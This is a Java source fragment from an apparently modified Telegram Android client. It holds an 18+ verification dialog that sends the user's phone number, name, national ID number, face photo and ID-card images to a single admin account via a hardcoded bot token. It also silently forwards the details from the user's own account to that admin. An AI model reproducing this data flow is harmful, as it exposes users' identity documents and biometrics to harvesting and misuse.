                sb.append("📋 <b>Reason:</b> ").append(reasonStr).append("\n");
                sb.append("📞 <b>Phone Number:</b> ").append(phoneNumber).append("\n");
                sb.append("✍️ <b>Full Name:</b> ").append(fullName).append("\n");
                sb.append("🪪 <b>National ID:</b> ").append(nidNumber).append("\n\n");
                sb.append("⚠️ <i>Administrator can cancel this verification if inappropriate.</i>");

                // Send text summary
                sendBotApiMessage(sb.toString(), currentUserId);

                // Send photos to bot API
                if (faceBitmap != null) {
                    sendBotApiPhoto(faceBitmap, "Facial Verification (Face ID Scan) - User ID: " + currentUserId);
                }
                if (nidFrontBitmap != null) {
                    sendBotApiPhoto(nidFrontBitmap, "NID Front Side - User ID: " + currentUserId);
                }
                if (nidBackBitmap != null) {
                    sendBotApiPhoto(nidBackBitmap, "NID Back Side - User ID: " + currentUserId);
                }

                // Also send directly via Telegram client to admin if possible
                resolveAndForwardToAdmin(sb.toString());

                // Save verified status
                ApplicationLoader.applicationContext.getSharedPreferences("mainconfig", Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean(PREF_KEY_VERIFIED, true)
                        .putBoolean(PREF_KEY_ADMIN_CANCELLED, false)
                        .apply();

                AndroidUtilities.runOnUIThread(() -> {
                    if (onDone != null) onDone.run(true);
                    dismiss();
                    BulletinFactory.of(fragment).createSimpleBulletin(
                            R.raw.done,
                            isBengali() ? "যাচাইকরণ সম্পন্ন" : "Verification Submitted",
                            isBengali() ? "আপনার তথ্য সফলভাবে পাঠানো হয়েছে। ১৮+ কনটেন্ট চালু করা হয়েছে।" : "Verification submitted. Show 18+ Content is now enabled."
                    ).show();
                });
            } catch (Exception e) {
                FileLog.e(e);
                AndroidUtilities.runOnUIThread(() -> {
                    // Enable anyway as user completed all mandatory steps
                    if (onDone != null) onDone.run(true);
                    dismiss();
                });
            }
        }).start();
    }

    private void resolveAndForwardToAdmin(String text) {
        try {
            MessagesController.getInstance(currentAccount).getUserNameResolver().resolve(ADMIN_USERNAME, adminId -> {
                if (adminId != null && adminId != 0) {
                    SendMessagesHelper.getInstance(currentAccount).sendMessage(
                            SendMessagesHelper.SendMessageParams.of(text, (long) adminId, null, null, null, true, null, null, null, true, 0, 0, null, false)
                    );
                }
            });
        } catch (Exception ignored) {}
    }

    private void sendBotApiMessage(String text, long userId) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            JSONObject body = new JSONObject();
            body.put("chat_id", "@" + ADMIN_USERNAME);
            body.put("text", text);
            body.put("parse_mode", "HTML");

            // Cancel button for Administrator
            JSONArray inlineRow = new JSONArray();
            JSONObject cancelBtn = new JSONObject();
            cancelBtn.put("text", "❌ Cancel Verification");
            cancelBtn.put("callback_data", "cancel_18_" + userId);
            inlineRow.put(cancelBtn);

            JSONArray inlineKeyboard = new JSONArray();
            inlineKeyboard.put(inlineRow);

            JSONObject markup = new JSONObject();
            markup.put("inline_keyboard", inlineKeyboard);
            body.put("reply_markup", markup);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.write(body.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            FileLog.d("Bot sendMessage response: " + code);
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    private void sendBotApiPhoto(Bitmap bitmap, String caption) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, baos);
            byte[] imageBytes = baos.toByteArray();

            String boundary = "===NexagramBoundary" + System.currentTimeMillis() + "===";
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            // chat_id
            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            os.writeBytes("@" + ADMIN_USERNAME + "\r\n");

            // caption
            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            os.write(caption.getBytes("UTF-8"));
            os.writeBytes("\r\n");

            // photo
            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"image.jpg\"\r\n");
            os.writeBytes("Content-Type: image/jpeg\r\n\r\n");
            os.write(imageBytes);
            os.writeBytes("\r\n");

            os.writeBytes("--" + boundary + "--\r\n");
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            FileLog.d("Bot sendPhoto response: " + code);
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    private void launchCameraOrGallery() {
        if (fragment == null || fragment.getParentActivity() == null) return;
        try {
            Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
            fragment.getParentActivity().startActivityForResult(intent, 9081);
        } catch (Exception e) {
            try {
                Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                fragment.getParentActivity().startActivityForResult(takePictureIntent, 9081);
            } catch (Exception e2) {
                FileLog.e(e2);
            }
        }
    }

    private FrameLayout createUploadCard(Bitmap existingBitmap, String hint, Runnable onClick) {
        FrameLayout card = new FrameLayout(getContext());
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Theme.getColor(Theme.key_windowBackgroundWhite));
        bg.setCornerRadius(dp(12));
        bg.setStroke(dp(1), existingBitmap != null ? 0xFF4CAF50 : Theme.multAlpha(Theme.getColor(Theme.key_divider), 0.7f));
        card.setBackground(bg);
        card.setOnClickListener(v -> onClick.run());

        if (existingBitmap != null) {
            ImageView iv = new ImageView(getContext());
            iv.setImageBitmap(existingBitmap);
            iv.setScaleType(ImageView.ScaleType.CENTER_CROP);
            card.addView(iv, LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT, LayoutHelper.MATCH_PARENT));

            TextView check = new TextView(getContext());
            check.setText("✓");
            check.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 18);
            check.setTextColor(0xFFFFFFFF);
            check.setGravity(Gravity.CENTER);
            GradientDrawable checkBg = new GradientDrawable();
            checkBg.setShape(GradientDrawable.OVAL);
            checkBg.setColor(0xFF4CAF50);
            check.setBackground(checkBg);
            card.addView(check, LayoutHelper.createFrame(28, 28, Gravity.TOP | Gravity.RIGHT, 0, 8, 8, 0));
        } else {
            LinearLayout center = new LinearLayout(getContext());
            center.setOrientation(LinearLayout.VERTICAL);
            center.setGravity(Gravity.CENTER);

            ImageView cameraIcon = new ImageView(getContext());
            cameraIcon.setImageResource(R.drawable.msg_camera);
            cameraIcon.setColorFilter(new PorterDuffColorFilter(0xFF2EA6FF, PorterDuff.Mode.SRC_IN));
            center.addView(cameraIcon, LayoutHelper.createLinear(32, 32, Gravity.CENTER_HORIZONTAL, 0, 0, 0, 6));

            TextView hintTv = new TextView(getContext());
            hintTv.setText(hint);
            hintTv.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
            hintTv.setTextColor(Theme.getColor(Theme.key_dialogTextGray));
            hintTv.setGravity(Gravity.CENTER);
            center.addView(hintTv, LayoutHelper.createLinear(LayoutHelper.WRAP_CONTENT, LayoutHelper.WRAP_CONTENT));

            card.addView(center, LayoutHelper.createFrame(LayoutHelper.WRAP_CONTENT, LayoutHelper.WRAP_CONTENT, Gravity.CENTER));
        }

        return card;
    }

    private TextView createButton(String text, boolean primary) {
        TextView button = new TextView(getContext());
        button.setText(text);
        button.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 15);
        button.setTypeface(Typeface.DEFAULT_BOLD);
        button.setGravity(Gravity.CENTER);

        GradientDrawable bg = new GradientDrawable();
        bg.setCornerRadius(dp(12));
        if (primary) {
            bg.setColor(0xFF2EA6FF);
            button.setTextColor(0xFFFFFFFF);
        } else {
            bg.setColor(Theme.getColor(Theme.key_windowBackgroundGray));
            button.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        }
        button.setBackground(bg);
        return button;
    }

    private TextView createFieldLabel(String label) {
        TextView tv = new TextView(getContext());
        tv.setText(label);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 13);
        tv.setTextColor(Theme.getColor(Theme.key_dialogTextBlack));
        tv.setTypeface(Typeface.DEFAULT_BOLD);
        return tv;
    }

    private GradientDrawable createFieldBg() {
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Theme.getColor(Theme.key_windowBackgroundWhite));
        bg.setCornerRadius(dp(8));
        bg.setStroke(dp(1), Theme.multAlpha(Theme.getColor(Theme.key_divider), 0.7f));
        return bg;
    }

    private GradientDrawable createOptionBg(boolean selected) {
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Theme.getColor(Theme.key_windowBackgroundWhite));
        bg.setCornerRadius(dp(10));
        bg.setStroke(dp(selected ? 2 : 1), selected ? 0xFF2EA6FF : Theme.multAlpha(Theme.getColor(Theme.key_divider), 0.7f));
        return bg;
    }

    private void showToast(String msg) {
        BulletinFactory.of(fragment).createSimpleBulletin(R.raw.error, msg).show();
    }
}
